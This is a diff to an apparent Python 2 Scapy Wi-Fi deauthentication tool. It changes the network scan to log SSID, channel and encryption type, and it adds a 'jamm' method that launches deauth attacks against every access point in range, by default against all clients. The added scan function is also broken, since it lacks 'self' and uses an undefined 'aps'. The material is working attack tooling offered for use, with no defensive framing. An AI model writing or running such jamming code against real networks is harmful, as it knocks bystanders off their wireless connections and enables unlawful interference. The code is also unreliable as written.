@@ -22,13 +22,33 @@ class Deauth:
             except invalidIface:
                 raise Exception("invalidIface")
 
-    def __add_network(self,pkt):
-        essid = pkt[Dot11Elt].info if '\x00' not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != '' else 'Hidden SSID'
+# Copied and modified from https://stackoverflow.com/questions/21613091/how-to-use-scapy-to-determine-wireless-encryption-type
+    def __insert_ap(pkt):
         bssid = pkt[Dot11].addr3
-        channel = int(ord(pkt[Dot11Elt:3].info))
-        if bssid not in self.networks:
-            self.networks[bssid] = (essid, channel)
-            print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)
+        if bssid in aps:
+            return
+        p = pkt[Dot11Elt]
+        cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
+                          "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
+        ssid, channel = None, None
+        crypto = set()
+        while isinstance(p, Dot11Elt):
+            if p.ID == 0:
+                ssid = p.info
+            elif p.ID == 3:
+                channel = ord(p.info)
+            elif p.ID == 48:
+                crypto.add("WPA2")
+            elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
+                crypto.add("WPA")
+            p = p.payload
+        if not crypto:
+            if 'privacy' in cap:
+                crypto.add("WEP")
+            else:
+                crypto.add("OPN")
+        print "AP: %r [%s], channed %d, %s" % (ssid, bssid, channel,' / '.join(crypto))
+        self.networks[bssid] = (ssid, channel, crypto)
 
     def __channel_hopper(self):
         while True:
@@ -51,10 +71,9 @@ class Deauth:
         channel_hop.join()
 
     def show_networks(self):
-        print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
         channel_hop = Process(target = self.__channel_hopper)
         channel_hop.start()
-        sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), timeout=10, prn=lambda x: self.__add_network(x) )
+        sniff(iface=self.iface, prn=self.__insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p), timeout = 15)
         channel_hop.terminate()
         channel_hop.join()
 
@@ -77,6 +96,15 @@ class Deauth:
         proc.start()
         self.processes[str(proc.pid)] = str(bssid) + " " + str(client)
 
+    def jamm(self, count = -1, client = 'FF:FF:FF:FF:FF:FF'):
+        if client == 'FF:FF:FF:FF:FF:FF':
+            print "[*] Deauthing everyone!"
+        else:
+            print "[*] Deauthing " + client + " from every wifi in the area"
+        for x in range(len(self.networks)):
+            proc = Process(target = self.__deauth, args = (self.networks.items()[x][0],client,count,))
+            proc.start()
+            self.processes[str(proc.pid)] = str(self.networks.items()[x][0]) + " " + str(client)
     def stop_deauth(self, all = False):
         if len(self.processes) == 0:
             print "Nothing is running :/"
